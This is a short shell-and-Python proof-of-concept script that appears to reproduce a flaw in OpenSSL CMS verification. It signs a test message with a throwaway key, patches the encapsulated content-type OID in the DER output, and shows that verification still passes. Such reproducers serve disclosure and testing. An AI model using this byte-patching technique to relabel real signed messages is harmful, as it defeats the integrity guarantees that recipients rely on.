#!/bin/sh
# Changes the content type of a signed CMS message without the signing key; CMS verification still succeeds.
#   OPENSSL=/path/to/openssl sh relabel-repro.sh
set -e
OPENSSL=${OPENSSL:-openssl}
d=$(mktemp -d)
cd "$d"
"$OPENSSL" req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 1 -subj "/CN=signer" 2>/dev/null
printf 'hello\n' > msg.txt
"$OPENSSL" cms -sign -binary -md sha256 -nodetach -outform DER -in msg.txt -signer cert.pem -inkey key.pem -out signed.der
echo "original:"
"$OPENSSL" cms -verify -noverify -binary -inform DER -in signed.der -out /dev/null
# encapContentInfo.eContentType is not covered by the signature; only the signed content-type attribute
# binds it (RFC 5652 11.1). Change it from id-data (1.2.840.113549.1.7.1) to 1.2.840.113549.1.7.5.
python3 - <<'PY'
b = bytearray(open("signed.der", "rb").read())
oid = bytes.fromhex("06092a864886f70d010701")
i = b.find(oid)        # the first id-data is eContentType; the one in the signed attributes comes later
b[i + len(oid) - 1] = 0x05
open("relabeled.der", "wb").write(b)
PY
echo "relabeled (eContentType 1.2.840.113549.1.7.5, content-type attribute still id-data):"
"$OPENSSL" cms -verify -noverify -binary -inform DER -in relabeled.der -out /dev/null
echo "files in $d"
